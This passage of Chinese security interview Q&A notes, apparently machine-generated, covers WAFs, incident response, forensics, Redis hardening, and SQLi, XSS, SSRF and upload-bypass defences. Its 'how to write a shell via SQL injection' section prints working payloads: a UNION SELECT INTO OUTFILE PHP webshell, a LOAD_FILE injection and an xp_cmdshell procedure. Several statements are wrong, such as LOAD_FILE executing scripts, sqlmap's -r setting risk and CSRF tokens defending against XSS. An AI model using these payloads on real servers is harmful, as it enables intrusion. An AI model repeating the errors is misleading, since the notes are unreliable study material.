SQL 语句，并对其进行相应的修复和防护。 跨站脚本（XSS）防护：WAF 可以检测并过滤包含恶意 JavaScript 代码的请求，并防止 XSS 攻击。 防止文件上传漏洞：WAF 可以检测并拦截包含恶意文件的请求，从而避免文件上传漏洞导致的攻击。 总之，WAF 产品可以有效地保护 Web 应用程序免受各种类型的攻击。但是需要注意的是，WAF 并不是万能的，仍然需要结合其他安全措施来保障 Web 应用程序的安全。 你有用过态势感知的产品吗？ 360态势感知：由中国著名安全厂商360推出的产品，主要提供网络威胁查询、漏洞扫描、流量分析等功能，同时集成了各种安全情报和指标，可以为用户提供全面的安全态势分析和预警服务。 腾讯云安全大脑：由腾讯云推出的产品，利用 AI、机器学习等技术对攻击进行实时监测和分析，提供包括漏洞扫描、风险评估、异常检测等一系列安全服务。 云锁事件响应中心：由阿里云推出的产品，提供网络空间威胁和安全事件的监测、预警、应急响应等服务。该产品采用 AI 算法进行态势感知，并可以自动化响应安全事故。 北京赛迪态势感知系统：由北京赛迪安全科技股份有限公司开发的产品，支持网络威胁情报搜集、风险事件自动识别、威胁行为关联分析等功能，可为企业提供全生命周期的网络安全保护。 启明星辰安全态势感知：由启明星辰推出的产品，提供整体安全态势感知、针对性攻击检测、应急响应等功能，可帮助用户实现从被动防御到主动防御的转变。 这些产品都采用了先进的机器学习和人工智能技术，可以自动化地分析和识别网络威胁，并及时发出预警或者采取应急措施。同时，这些产品还具备可视化的操作界面，用户可以通过简单的操作就可以了解整个系统的安全情况，并做出相应的决策。 什么是跨域，JSONP 与 CORS在 Web 开发中，跨域（Cross-Origin）指的是当一个 web 应用程序在访问另一个与其来源（协议、域名或端口号）不同的 web 应用程序时所发生的浏览器安全限制。这种限制可以防止非法的数据窃取和恶意代码的注入，从而保障了用户的信息安全。 为了解决跨域问题，Web 安全领域出现了两种常见的技术：JSONP 和 CORS。 JSONP：JSONP（JSON with Padding）是一种跨域请求数据的方式，原理是通过在 HTML 页面上使用 script 标签加载远程 JSON 数据，并通过回调函数处理获取到的数据。这种方式可以绕过浏览器的同源策略，但只支持 GET 请求。 CORS：CORS（Cross-Origin Resource Sharing）是在服务器端设置允许跨域请求的机制。它通过在 HTTP 头信息中添加一些字段来告诉浏览器该服务器允许哪些域名的请求。CORS 可以支持各种类型的 HTTP 请求，并且比 JSONP 更加灵活和安全。 总之，无论是 JSONP 还是 CORS，都是为了解决跨域问题而设计的技术。开发人员可以根据自己的需求来选择适合自己的方式，并结合安全考虑进行使用。同时，为了保护用户的信息安全，在使用跨域技术时，需要特别注意对传输数据的加密和防篡改措施。 如何发现钓鱼邮件钓鱼邮件是一种常见的网络针对性攻击手段，通常通过电子邮件发送虚假信息诱骗受害者提供个人敏感信息或进行非法行为。以下是几种发现钓鱼邮件的方法： 查看发件人地址：钓鱼邮件的发件人地址通常会伪装成合法、可信的机构或公司，但是如果您仔细查看发件人地址，就可能发现其不是该机构或公司真正的域名。 检查链接地址：钓鱼邮件中通常会包含可疑的链接，如果您将鼠标悬停在链接上，就可以看到链接的真实地址。如果该地址与邮件内容不符，就可能是钓鱼邮件。 注意邮件内容：钓鱼邮件通常会给人留下一种紧急、必须立即采取行动的感觉，从而诱骗用户点击链接或执行某些操作。因此，如果您收到这样的邮件，请仔细阅读邮件内容，并多加思考和确认。 尽量避免下载附件：钓鱼邮件通常会携带恶意附件，如果您无法确认邮件的真实性，最好不要下载或打开这些附件，以免被感染。 安装反钓鱼软件：有一些反钓鱼软件可以帮助用户检测和拦截钓鱼邮件，例如 Google 的 Password Alert 等。 总之，发现钓鱼邮件需要多加警惕和注意，在收到可疑邮件时，应该仔细查看邮件内容和相关信息，并尽可能采取措施避免被钓鱼攻击。 如何查看区分是扫描流量和手动流量扫描流量和手动流量的区别在于其产生的方式和行为特征，因此可以通过以下几种方法来查看区分它们： 查看流量来源：扫描流量通常是由自动化工具或蠕虫病毒等程序生成的，因此其源 IP 或者发起请求的主机通常不固定，而手动流量则来自人工操作的设备，其请求的 IP 地址和用户代理信息都会有所不同。 检测流量频率和规律：扫描流量通常会呈现出周期性、规律性的访问行为，例如连续大量的 TCP SYN 请求等。而手动流量则通常难以呈现出明显的规律和周期性。 观察流量的请求路径和参数：扫描流量通常是为了探测系统漏洞和弱点而产生的，它们通常会对一些已知的 URL 和参数进行大量的尝试，并使用一些特殊的 HTTP 头部信息。而手动流量则更加多样化，可能会包含更丰富的请求路径和参数。 分析流量的响应状态码和长度：扫描流量通常会通过检测返回的状态码和页面长度等信息来判断目标是否存在漏洞或弱点。手动流量则通常会具有更加正常的响应状态码和页面长度。 总之，通过综合分析流量来源、访问规律、请求路径和参数以及响应状态码等特征，我们可以比较准确地区分扫描流量和手动流量，并采取相应的防御措施。 遇到.exe 文件如何处理？.exe 文件是 Windows 上的可执行文件，通常包含应用程序或者安装程序等内容。如果您在电子邮件或者网络上收到了 .exe 文件，需要格外小心，因为它们可能包含病毒、恶意软件或者其他危险物品。以下是几种处理方法： 不要直接运行：不要轻易双击或者打开未知来源的 .exe 文件，因为它们可能会启动恶意软件，并对您的系统造成损害。如果您必须要运行这些 .exe 文件，请先进行杀毒软件扫描和检测操作。 使用虚拟机：如果您需要测试某个 .exe 文件的行为和效果，可以考虑使用虚拟机。虚拟机可以将一个完整的操作系统运行在一个软件容器中，使得用户可以在其中安全地运行可疑的 .exe 文件，并且不会影响主机系统的安全性。 上传到在线扫描服务平台：一些在线杀毒软件平台，例如 VirusTotal 等，提供了在线扫描可疑文件的服务。如果您不确定一个 .exe 文件是否安全，可以上传到这些平台进行扫描，以获取更多的信息和建议。 将文件发送给安全专家：如果您无法确定 .exe 文件的安全性，可以将其发送给安全专家进行分析。安全专家可以根据其行为特征和结构等信息，对该文件进行深度分析，以确定是否存在潜在的安全威胁。 总之，在处理未知来源的 .exe 文件时，需要注意谨慎并采取必要的安全措施，以确保您的系统不会被攻击或感染。如果您遇到可疑的 .exe 文件，请务必进行杀毒软件扫描，并尽可能获取更多的信息和建议。 应急响应的排查思路？应急响应的排查思路主要包括以下几个方面： 确认事件：首先需要了解事件的具体情况，包括发生的时间、影响范围、受影响的系统和服务等信息。同时还需要判断是否存在钓鱼邮件、病毒感染等情况，以确定是否存在网络安全事件。 收集证据：在确认安全事件后，需要及时收集相关证据，包括日志记录、网络流量、进程信息、文件系统状态等信息，并进行存档备份。这些证据可以为后续的分析提供依据。 分析数据：对收集到的证据进行分析，尤其是日志和网络流量等数据，可以帮助快速定位问题和确认是否存在攻击行为。在分析过程中，可以利用一些常见的工具，例如 Wireshark、Nmap、Sysinternals 等。 阻止攻击：在确认存在攻击行为后，需要立即采取措施，阻止攻击并保护现有系统。这些措施包括封锁网络、隔离受感染主机、关闭漏洞等。 制定应急计划：根据分析结果，制定相应的应急计划，确保系统能够迅速恢复正常的运行状态。应急计划应该包括恢复数据、修复漏洞、加强安全防御等方面。 总之，应急响应排查思路需要遵循快速响应、收集证据、分析数据、阻止攻击和制定应急计划等原则，并且需要依靠专业的技能和工具来实现。在实际操作中，需要小心谨慎，同时保持高度警惕和敏锐性。 普通的加固手段？普通的加固手段包括以下几种： 更新补丁：定期更新操作系统、应用程序的补丁，修复已知的漏洞和安全问题。 强化口令策略：采用复杂、难以猜测的密码，并进行定期更换。同时可以启用账户锁定、多次失败尝试限制等功能，提高口令安全性。 加强身份验证：采用多因素身份验证技术，例如使用硬件令牌、生物特征等方式，确保只有授权用户才能访问系统。 安装防病毒软件：安装并及时更新防病毒软件，定期进行全盘扫描和实时监控，以便及时发现和处置潜在的恶意软件。 关闭不必要服务：关闭系统中不必要的服务和端口，降低攻击面，避免被利用。 限制访问权限：根据业务需要，设置合理的访问权限，对于未授权的用户或者设备进行限制，提高系统的安全性。 数据备份与恢复：定期备份重要数据，并将其存储在安全可靠的位置。在出现故障或事件时，能够快速恢复数据，避免数据丢失和系统停机。 总之，以上这些普通的加固手段可以帮助提高系统的安全性和稳定性，并且也是网络安全基础建设的关键步骤。在实际操作中，需要根据具体情况和需求，结合其他安全措施来进行综合加固。同时需要注意及时更新和检查，以确保系统始终处于安全状态。 redis未授权的条件，修复方式？Redis 未授权访问是指某些 Redis 实例的访问控制没有得到正确配置，导致攻击者可以通过不需要认证的方式直接连接该实例并进行操作。这可能会导致敏感数据泄露、系统被攻击等安全问题。 修复 Redis 未授权访问的方式包括以下几个步骤： 确认是否存在未授权访问：通过检查日志和网络流量等信息，确认是否存在未授权访问的情况。 修改 Redis 配置文件：在 redis.config 配置文件中，找到 bind 参数并将其设置为 Redis 监听的 IP 地址。此外，还需要设置 requirepass 参数，并设置一个强密码来保护 Redis 数据库。 重新启动 Redis 服务：在修改完 Redis 配置文件后，需要重新启动 Redis 服务，以便使新的配置生效。 禁用 Redis 远程访问：如果您的 Redis 服务只在本地使用，则应禁用 Redis 的远程访问，以降低攻击面和提高安全性。 定期更新 Redis 和操作系统补丁：及时更新 Redis 和操作系统的安全补丁，以修复已知漏洞和提高系统安全性。 总之，在修复 Redis 未授权访问时，我们需要先确认是否存在未授权访问的情况，然后按照上述步骤进行修复。为了保证系统安全，我们还需要经常检查 Redis 配置文件和操作系统状态，及时更新补丁，并定期进行安全审计和漏洞扫描等操作。 被攻击后，日志文件以及木马文件被删除怎样排查被攻击后，日志文件和木马文件被删除会给排查工作带来很大的困难，但还是有一些方法可以尝试： 查看系统备份：如果您的系统进行了定期备份，那么可以尝试从备份中恢复丢失的日志文件和木马文件。如果备份没有受到攻击，那么这种方式可能会非常有效。 恢复已删除文件：一些数据恢复软件，例如Recuva、EaseUS Data Recovery等，可以恢复已删除的文件。您可以尝试使用这些软件来恢复被删除的文件。 检查其他主机：如果您的系统被集成到网络中，可以检查其他主机是否有相同的攻击迹象和后门程序。对于攻击者来说，攻击多台主机通常需要更多的时间和资源，因此在其他主机上发现类似的攻击行为也许能够提供有用的信息。 分析系统快照：如果您的系统支持系统快照功能，例如 Windows 系统还原点，可以尝试回滚系统至之前的快照状态，并分析该状态下的日志信息和系统状态，以寻找攻击行为的证据。 日志审计：如果日志文件被删除，可以尝试通过其他渠道收集日志信息，并进行审计分析。例如，可以检查网络流量、系统性能、系统进程等信息，以确定是否存在异常行为。 总之，在日志文件和木马文件被删除的情况下，需要采用其他方法来寻找攻击迹象和证据。同时，为了避免这种情况的发生，我们应该在系统中设置必要的日志轮转和备份策略，并加强安全防御工作，避免被攻击者入侵。 安全设备报警安全设备报警是指安全设备（例如入侵检测系统、防火墙、安全加固等）监测到的与安全相关的事件或活动达到了预先设定的规则和阈值，触发了警报通知。以下是一些处理安全设备报警的方法： 确认警告的真实性：首先需要确认收到的警报信息是否为真实的安全事件，需要对日志和其他相关信息进行分析和验证。如果发现确实存在安全问题，则需要立即采取适当措施。 优先级分类：不同类型的安全事件具有不同的严重程度和威胁级别，需要根据事件的类型、来源等因素进行分类和优先级排序，并采取相应的措施进行处理。 制定处理计划：根据事件情况和优先级，制定相应的处理计划和操作流程。这些计划可以包括隔离受感染主机、采取补救措施、收集证据等方面。 跟踪事件进展：在处理安全事件时，需要跟踪事件的进展和结果，并及时更新相关记录和文档。同时要保持与相关人员的沟通和协调，以便及时解决问题。 定期复查：定期审查和分析系统和设备的报警记录和日志，以及采取的应对措施和效果。这可以帮助发现系统中存在的风险和漏洞，并及时加以修复和优化。 总之，在处理安全设备报警时，需要快速响应、分类优先、制定计划等步骤，以保障系统的安全性，并且需要持续地监测和优化安全防御策略。 日志与流量分析日志和流量分析是网络安全领域中常用的两种技术。它们都可以帮助安全人员更好地了解系统的状态，检测和预防威胁。 日志分析是指对服务器、应用程序等产生的日志进行收集、存储、分析和处理，以便了解系统的运行状况和发现异常事件。通过对日志数据的统计和分析，可以追踪用户活动、系统错误、安全事件等，以及发现潜在的风险和漏洞。比如，通过分析登录日志可以检测到恶意登录尝试；通过分析访问日志可以了解网站的被攻击情况。 流量分析是指对网络流量进行收集、存储、分析和处理，以便了解网络连接的状态，检测和预防网络攻击。通过对流量数据的统计和分析，可以追踪网络通信、检测威胁和漏洞，比如检测恶意流量、DDoS攻击等。流量分析通常需要使用专业的工具和技术，包括网络协议分析、流量捕获和分析软件等。 综上所述，日志和流量分析是网络安全中非常重要的技术，它们可以帮助安全人员发现和解决潜在的安全问题，并维护系统和网络的正常运行。 服务器资源异常 检查服务器负载情况：使用系统监视工具（如top、htop或glances等）来检查服务器的负载状况。如果负载过高，请考虑升级服务器资源或调整应用程序配置。 清理硬盘空间：如果硬盘空间不足，可以删除不必要的文件和日志，或者将它们移到其他存储设备上。 优化数据库：如果您的应用程序使用了数据库，可以尝试优化数据库以提高性能和减少资源使用。 减少并发连接数：如果您的应用程序支持并发连接，可以考虑限制同时连接的数量，从而减轻服务器压力。 升级服务器硬件：如果您的服务器硬件过时，升级服务器硬件可能是一个好选择。 这里列出的是一些常见的解决方法，但具体应该根据您的问题和实际情况进行分析和处理。 邮件钓鱼邮件钓鱼是一种利用欺骗手段获取用户敏感信息（如用户名和密码）的网络攻击。以下是一些防范邮件钓鱼的措施： 仔细检查发件人和链接：在打开或回复任何邮件之前，请确保发件人地址是正确的，并且不要点击任何可疑的链接。 不要泄露敏感信息：请不要在电子邮件中提供敏感信息，例如您的用户名、密码或银行卡号码等。 使用邮件过滤器：许多电子邮件服务提供商都有垃圾邮件和恶意软件过滤器，可以帮助防止钓鱼邮件进入您的收件箱。 使用双因素身份验证：如果可能的话，请使用双因素身份验证来增强账户安全性。 教育员工：对于企业来说，教育员工如何识别和应对钓鱼邮件至关重要，这将有助于减少安全风险。 总之，防范邮件钓鱼需要我们保持警惕，小心处理邮件，避免泄露敏感信息，使用合适的安全工具，加强安全意识培训。 蜜罐系统蜜罐系统是一种安全防御技术，它通过模拟真实系统和应用程序环境来诱导攻击者进行攻击，以便收集攻击者的行为信息并保护真实系统免受攻击。 蜜罐系统通常包括以下组件： 虚拟机：虚拟机用于运行蜜罐操作系统和应用程序，并提供与真实系统类似的环境。 模拟应用程序：模拟应用程序模拟真实应用程序的功能，但同时也被设计成易受攻击的。 监听器：监听器负责记录攻击者的所有行为，例如攻击方式、攻击目标、攻击时间等。 分析器：分析器负责对监听器收集到的数据进行分析，并生成相关的报告。 使用蜜罐系统可以帮助安全团队更好地了解攻击者的行为和策略。此外，当攻击发生时，蜜罐系统还可以吸引攻击者并分散他们的注意力，从而降低真实系统遭受攻击的风险。 但需要注意的是，使用蜜罐系统也存在一些风险，如攻击者可能会利用蜜罐系统来了解防御策略和安全漏洞，因此在使用蜜罐系统时需要谨慎评估其风险和收益。 溯源反制手段溯源反制手段是指在网络攻击发生后，对攻击来源进行追踪和分析，以便采取相应的反制措施。以下是一些常见的溯源反制手段： IP地址追踪：通过IP地址追踪可以确定攻击者的地理位置和ISP信息等，并且可以将这些信息提供给执法机构进行调查和追诉。 系统日志分析：系统日志记录了系统的所有活动信息，包括用户登录、访问权限、进程启动等。通过对系统日志的分析，可以了解攻击的时间、方式和攻击者可能留下的痕迹。 恶意软件分析：恶意软件通常会留下特定的标志或指令，这些标志或指令可以帮助分析人员了解攻击者的目的和策略。通过分析恶意软件，还可以发现其它潜在的安全威胁。 威胁情报分析：威胁情报分析可以帮助判断攻击者的目的和策略，并可以收集针对特定攻击的信息和反制策略。 电子邮件头分析：邮件头中包含了一些关于发送方和接收方的信息，例如IP地址、电子邮件客户端类型等。通过分析邮件头，可以确定攻击者的来源和行踪。 总之，在进行溯源反制时，需要综合运用多种手段，从多个角度收集信息，并对这些信息进行深入分析，以便更好地了解攻击的情况，采取相应的反制措施。 通过wireshark工具如何对流量进行溯源？Wireshark是一个网络抓包工具，可以捕获和分析网络流量。以下是使用Wireshark工具对流量进行溯源的步骤： 打开Wireshark软件并开始捕获网络流量。 过滤出需要关注的数据包。例如，如果要寻找某个IP地址的流量，可以在Wireshark中使用过滤器“ip.addr == [目标IP地址]”来过滤出相关数据包。 找到涉及目标IP地址的数据包，并分析它们。可以查看数据包的详细信息，例如源IP地址、目标IP地址、端口号、协议类型等，以获取更多有关攻击者的信息。 根据数据包的来源IP地址和端口号，确定攻击者可能所在的网络或主机。可以通过WHOIS查询来了解更多信息，例如注册人姓名、电子邮件地址、电话号码等。 对数据包进行深入分析，以判断是否存在恶意活动。例如，检查数据包中传输的文件是否被感染，或者检查是否存在异常流量或频繁的连接尝试等。 总之，通过Wireshark工具对流量进行溯源需要我们认真观察和分析数据包，尤其需要关注目标IP地址和涉及该地址的数据包，从多个角度收集信息，以便更好地了解攻击的情况，并采取相应的反制措施。 如何定位到攻击 IP为了定位到攻击IP，您可以跟随以下步骤： 收集攻击事件的日志信息：首先，您需要获取与攻击相关的日志信息。这可能包括服务器、网关或IDS/IPS设备等的日志文件。检查这些日志文件以查看攻击事件的详细信息。 确定攻击类型：根据攻击日志信息，确定攻击类型，例如DDoS攻击、SQL注入等。 使用网络嗅探工具：您可以使用像Wireshark这样的网络嗅探工具来捕获和分析网络流量。通过分析数据包，您可以确定攻击流量的来源IP地址。 分析网络流量：对分析出的流量进行深入分析，查找异常流量特征。例如，您可以检查是否有大量流量来自同一IP地址或者是否有许多连接尝试来自相同的IP地址。 使用WHOIS查询：使用WHOIS查询可以帮助您查找IP地址归属地和注册人信息，以便更好地了解攻击者的位置和身份。 采取反制措施：最后，根据收集到的信息，确定攻击者的IP地址，并采取相应的反制措施，例如在防火墙中添加黑名单规则或使用安全设备来抵御攻击。 需要注意的是，攻击者可能会使用虚假或伪造的IP地址来掩盖自己的身份和位置。在这种情况下，您可能需要使用其他技术手段来确定攻击者的真实来源。 常用取证工具有哪些常用的取证工具包括： FTK（Forensic Toolkit）：一款全面的数字取证工具，可以获取、分析和报告各种数字数据。 EnCase：一款商业化的取证工具，广泛应用于执法机构和企业中。 X-Ways Forensics：一款功能强大的取证工具，可以解析多种文件系统和磁盘映像格式。 Autopsy：一个免费的开源取证工具，可以帮助用户快速识别证据并生成相应的报告。 Volatility Framework：一个基于内存取证的工具，可以提取运行中操作系统的进程、内核模块和网络连接等信息。 Wireshark：一款流量分析工具，可以捕获和分析网络数据包，并对其进行深入的分析。 Forensic Browser for SQLite：一款专门用于SQLite数据库的取证工具，可以查看、搜索和导出SQLite数据库中的数据。 这些工具都有各自的优缺点和适用场景，根据实际需求选择合适的工具很重要。 溯源的常见手法？数字溯源是指通过分析数字证据，追踪和还原事件或活动的发生过程和轨迹。常见的溯源手法包括： 网络日志溯源：根据网络日志记录来追踪网络活动的来源、目的地和传输路径。 数据库溯源：通过对数据库中数据修改、删除和查询等操作的记录，还原出相关事件的发生过程。 软件代码溯源：通过对软件代码进行逆向分析，确定软件的功能、用途和开发者信息。 文件元数据溯源：通过分析文件元数据（如文件创建时间、修改时间和所有者信息等），确定文件的来源和修改历史。 实体设备溯源：通过物理取证、数据提取和分析，还原数字设备被使用的历史记录和活动轨迹。 综合运用这些溯源手法，可以有效地追踪和还原数字活动的整个过程，为刑事侦查、安全审计和企业风险管理等领域提供重要支持。但值得注意的是，数字溯源需要遵守严格的法律程序和规范，并尊重用户的隐私权和数据保护要求。 如何封ip封禁IP是指通过防火墙或其他网络安全设备，阻止某个IP地址对网络资源进行访问。封禁IP可以有效地防止恶意攻击、网络滥用和非法访问等问题，保护网络安全。 以下是封禁IP的一般步骤： 登录防火墙或其他网络安全设备，进入配置界面。 找到IP过滤规则或黑名单功能，添加封禁规则。 在规则中填写要封禁的IP地址或IP地址段。 设置封禁的时间或持续期限（如永久封禁或暂时封禁）。 保存设置并生效，检查是否成功封禁目标IP。 需要注意的是，在封禁IP之前，应该确认被封禁的IP确实存在安全问题，并遵守相应的法律和政策规定，以免误伤合法用户和引发纠纷。同时，应该及时监控封禁效果，并在必要的情况下进行调整和解除封禁。 sql注入产生的原因是什么SQL注入是一种攻击技术，它利用应用程序没有正确过滤或转义用户输入的数据，导致恶意用户可以向应用程序的后台数据库中插入恶意代码。这通常是因为应用程序没有有效地验证和处理用户输入数据，从而允许攻击者在输入框中输入特定的字符或语句，以绕过应用程序的安全性措施。 例如，如果一个应用程序允许用户在登录时输入用户名和密码，但没有正确地过滤输入的数据，那么攻击者可以尝试在用户名或密码字段中输入SQL查询的一部分，从而绕过身份验证，甚至执行任意的数据库操作。 因此，要防止SQL注入攻击，应用程序需要对所有用户输入进行严格的验证和处理，以确保任何输入的数据都被正确地过滤、转义或编码，从而避免可能导致注入攻击的特殊字符或语句被传递到数据库服务器。 sql注入怎么修复修复SQL注入漏洞的主要方法之一是使用参数化查询。这种技术可以将用户输入作为参数传递给数据库查询，而不是将其拼接到查询字符串中。通过这种方式，应用程序可以避免恶意用户在输入中注入任何SQL代码。 另一个修复SQL注入漏洞的方法是对输入数据进行严格的验证和过滤。这需要开发人员仔细检查所有用户输入数据，并确保它们只包含有效的字符和格式。例如，如果一个输入字段只接受数字，则必须验证输入是否仅包含数字，并拒绝包含其他字符的输入。 最后，还可以使用安全的编程实践来保护应用程序免受SQL注入攻击。这包括限制应用程序的权限以及使用加密和身份验证等安全措施来保护数据库服务器和应用程序。 总之，修复SQL注入漏洞的关键是开发人员需要了解并理解如何处理用户输入，并采取必要的措施来确保输入数据的完整性和安全性。 xss是什么XSS（Cross-site scripting）是一种攻击技术，也是Web应用程序中最常见的漏洞之一。它利用了应用程序没有正确过滤或转义用户输入的数据，导致恶意用户可以向网站上注入恶意脚本代码，使其他用户在浏览网站时受到攻击。 XSS攻击通常发生在包含表单、搜索框和评论框等用户输入区域的Web页面上。攻击者会向这些输入框中插入包含恶意脚本代码的数据，以便当其他用户在访问该页面时执行这些恶意代码，从而实现攻击目的。 例如，如果一个在线购物网站没有对用户在评论框中输入的HTML代码进行过滤，那么攻击者可以通过在评论框中注入恶意JavaScript代码来窃取其他用户的登录凭证或个人信息。 因此，要防止XSS攻击，开发人员需要对所有用户输入进行严格的验证和处理，并对任何输入的数据进行必要的过滤和转义，以确保所有输入的数据都不能被解释为恶意脚本。此外，还可以使用安全的编程实践和安全框架来保护网站免受XSS攻击的危害。 xss攻击如何防御为了防止XSS攻击，开发人员可以采用以下措施： 输入过滤和验证：对于用户输入的数据进行严格的过滤和验证，只允许输入必要的字符和格式，并拒绝不受支持的HTML、CSS或JavaScript代码。 输出编码和转义：在将任何用户输入输出到Web页面上之前，请确保对其进行编码和转义，以确保它们不会被解释为恶意脚本。例如，在输出HTML时，可以使用HTML实体编码将特殊字符（如&lt;、&gt;、&amp;）转换为等效的字符实体。这样可以避免浏览器将它们解释为HTML标签或JavaScript代码。 使用安全框架和库：许多Web应用程序框架和安全库提供了内置的XSS防御机制，例如跨站点请求伪造（CSRF）令牌和自动输出编码。使用这些框架和库可以大大减少XSS攻击的风险。 学习安全编程实践：开发人员应该学习并遵循安全编程实践，例如安全的HTTP头设置、HTTPS使用、安全的Cookie管理等。 定期漏洞扫描和修复：定期运行漏洞扫描工具来检测网站中的潜在XSS漏洞，并及时修复这些漏洞，以避免遭受攻击。 加强用户教育：通过向用户提供安全意识培训和提示，可以帮助他们了解如何保护自己不受XSS攻击的危害，例如不点击垃圾邮件中的链接，不下载未经验证的文件等。 ssrf是什么SSRF（Server-side Request Forgery，服务端请求伪造）是一种攻击技术，攻击者通过在受害者服务器上执行恶意代码，使该服务器对指定的目标URL发起网络请求。这种攻击通常利用了开发人员在编写Web应用程序时没有正确处理用户输入数据的漏洞，例如将用户提供的URL参数直接传递给后台服务器而没有做任何验证。 在SSRF攻击中，攻击者可以欺骗Web应用程序向其他服务器发送HTTP请求，例如内部服务器、本地网络资源或公共Web API等。攻击者还可以使用SSRF攻击来绕过防火墙保护，访问内部系统，并执行未授权的操作，例如读取机密数据、修改配置文件或上传恶意文件等。 为了避免SSRF攻击，开发人员需要采取以下措施： 对所有输入进行严格的验证和过滤：开发人员在编写Web应用程序时应对所有输入数据进行严格的验证和过滤，以确保不会将任何恶意代码或非法请求发送到受害者服务器。 使用白名单：开发人员可以使用白名单技术限制应用程序仅向可信的服务器发送请求，例如内部服务器或特定的Web API。 限制服务器端请求发出范围： 在服务器上的Web应用程序必须限制服务器端请求的发出范围，例如通过禁止或限制特定的协议、域名或IP地址，以避免攻击者可以利用SSRF漏洞来发送恶意请求。 防火墙保护：使用防火墙的隔离技术可帮助防止恶意代码和非法请求进入Web应用程序，并限制其对其他系统的访问。 ssrf和csrf的区别SSRF（Server-side Request Forgery，服务端请求伪造）和CSRF（Cross-site Request Forgery，跨站请求伪造）是两种不同的攻击类型，它们主要的区别在于攻击的目标和方式。 SSRF攻击是一种通过欺骗服务器来发送恶意请求的攻击技术，攻击者利用服务器上的漏洞进行攻击，并使服务器对指定的目标URL发起网络请求，从而达到恶意操作的目的。SSRF攻击主要针对服务器端应用程序。 而CSRF攻击则是一种利用用户身份验证信息来执行未经授权的操作的攻击，攻击者通过欺骗用户访问包含恶意代码的网站，来达到获取用户敏感信息、执行交易等攻击目的。CSRF攻击主要针对客户端浏览器。 另外，防御SSRF攻击和CSRF攻击的方法也有所不同。防御SSRF攻击需要对所有输入进行严格的验证和过滤，并使用白名单技术限制应用程序只向可信的服务器发送请求。而防御CSRF攻击需要使用随机的令牌（如CSRF Token）来验证每个请求的来源是否合法，并防止攻击者能够伪造请求或欺骗用户进行非法操作。 总之，虽然SSRF攻击和CSRF攻击是两种不同的攻击类型，但它们都需要开发人员采取必要的防御措施来确保Web应用程序和用户数据的安全。 文件上传如何绕过文件上传功能是许多Web应用程序中常见的功能之一，它可以让用户上传各种类型的文件。然而，如果没有正确的安全措施，攻击者可能会利用文件上传功能绕过应用程序的安全性控制并上传恶意文件。以下是一些攻击者可能使用的绕过方法： 修改文件扩展名：攻击者可以将可执行文件的扩展名更改为其他文件格式的扩展名，例如将.exe文件更改为.jpg文件。这样，即使应用程序检查文件扩展名，也会认为该文件是合法的图像文件。 绕过文件类型检查：应用程序通常会限制上传文件的MIME类型或文件头，以确保只允许上传合法的文件。但是，攻击者可以通过修改文件头或添加特殊字符等方式来伪装文件类型和内容，从而绕过文件类型检查。 利用漏洞：应用程序可能存在漏洞，如目录遍历、任意文件上传等漏洞，攻击者可以利用这些漏洞来上传恶意文件，并在服务器上执行任意代码。 为了防止文件上传漏洞被攻击者利用，开发人员可以采取以下措施： 对所有上传文件进行严格的验证和过滤：开发人员应该对上传的文件类型、大小、MIME类型等进行严格的验证和过滤，确保只允许上传合法的文件。并且在服务器端进行对上传文件类型、大小、MIME类型等的再次检查。 为上传文件生成唯一的文件名：开发人员可以为每个上传文件生成唯一的文件名，以避免攻击者通过上传恶意文件来覆盖或修改其他文件。 使用安全的文件上传库：使用安全的文件上传库，例如PHP的move_uploaded_file函数可以确保文件上传的安全性。 对上传目录设置权限：只允许应用程序访问上传目录，并设置适当的目录权限，以防止攻击者上传和执行恶意文件。 总之，开发人员需要对文件上传功能进行充分的安全测试，并采取必要的措施来防止攻击者利用漏洞绕过文件上传功能的安全限制。 java反序列化Java反序列化是一种Java对象序列化（将Java对象转换为字节流）的逆过程，即将字节流重新转换回Java对象。在Java中，可以使用ObjectInputStream类来实现反序列化。虽然Java反序列化本身是一种有用的技术，但它也可能导致安全风险。 Java反序列化漏洞是指恶意用户通过发送精心构造的序列化数据并触发其反序列化过程，从而执行未经授权的代码或操作。攻击者可以利用此漏洞来执行远程命令、绕过应用程序的安全检查、窃取敏感信息等攻击。 为了防止Java反序列化漏洞的攻击，开发人员可以采取以下措施： 处理未信任的数据：开发人员应该避免反序列化未受信任的数据，例如来自不可靠来源的网络请求或从未知来源的文件读取的数据。 使用安全的序列化库：一些第三方序列化库，如Jackson和Gson等，提供了更加安全的序列化和反序列化功能。开发人员可以使用这些库来避免Java反序列化漏洞。 实现自定义反序列化方法：对于那些包含重要数据且需要进行反序列化的Java对象，可以实现自定义反序列化方法以控制反序列化过程。 消除未使用的反序列化代码：如果没有必要进行反序列化操作，开发人员可以将其删除或注释掉，以减少潜在的攻击面。 定期更新和维护应用程序：及时更新和修复应用程序中的漏洞和错误，并使用相关的安全工具来检测和防止Java反序列化漏洞。 总之，要解决Java反序列化漏洞，开发人员需要对代码进行充分的安全测试，加强对数据的严格验证和过滤，并采取必要的措施来保护应用程序的安全性。 sql注入如何写shell在SQL注入攻击中，如果攻击者成功地注入了一些恶意的SQL代码，则可以利用这些漏洞来执行各种操作，包括编写shell。以下是攻击者可能使用的几种技术： 利用UNION SELECT语句：通过构造一个带有UNION SELECT语句的SQL查询，攻击者可以在结果集中插入一些命令，并通过这些命令来编写shell，例如在 MySQL 中可以使用 INTO OUTFILE 来将结果输出到文件中。 例如，以下语句可以在MySQL中编写shell： 123PLAINTEXThttp://example.com/products.php?id=1 UNION SELECT &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,2 INTO OUTFILE &quot;/var/www/html/shell.php&quot;; 利用LOAD_FILE函数：如果应用程序允许使用LOAD_FILE函数加载文件，攻击者可以使用该函数来读取并执行任意的本地shell脚本文件。 例如，在MySQL中，攻击者可以使用以下代码来读取并执行一个本地shell脚本： 123PLAINTEXThttp://example.com/products.php?id=-1&#x27; UNION SELECT LOAD_FILE(&#x27;/path/to/malicious/script.sh&#x27;),&#x27;&#x27;,&#x27;&#x27; 利用指定数据库的存储过程：攻击者可以使用存储过程来创建和执行恶意的shell脚本，例如在Microsoft SQL Server中，可以使用以下代码来创建并执行一个命令解释器： 1234567891011PLAINTEXTCREATE PROCEDURE sp_ExecCmd (@cmd varchar(1000))ASBEGINDECLARE @ret intEXEC @ret = master..xp_cmdshell @cmdENDGOEXEC sp_ExecCmd &#x27;command&#x27; 攻击者利用SQL注入漏洞来执行命令或编写shell是非常危险的，因此，在编写应用程序时必须采用适当的安全措施，例如对所有输入数据进行严格的验证和过滤，并使用参数化查询来避免SQL注入攻击。 sqlmap中risk和levels区别在SQL注入扫描器sqlmap中，-r 参数表示风险等级，-level 